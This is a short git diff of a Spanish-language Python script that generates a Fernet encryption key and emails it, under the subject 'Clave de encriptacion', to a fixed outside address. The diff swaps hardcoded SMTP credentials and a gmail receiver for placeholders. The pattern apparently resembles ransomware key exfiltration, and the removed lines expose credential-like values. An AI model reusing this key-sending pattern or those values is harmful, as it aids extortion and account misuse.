@@ -16,8 +16,8 @@ key = Fernet.generate_key()
 
 key_text = key.decode("utf-8")
 
-sender_mail = "bbd4a7a0c20d3d"
-sender_password = "cea3828f9e0ceb"
+sender_mail = "MAIL"
+sender_password = "PASSWORD"
 
 def send_email(receiver_email, subject, message):
     try:
@@ -36,7 +36,7 @@ def send_email(receiver_email, subject, message):
     except Exception as e:
         print(f"Error al enviar el correo electronico: {e}")
 
-receiver_email = "elpepe68el@gmail.com"
+receiver_email = "gmail"
 
 subject = "Clave de encriptacion"
 
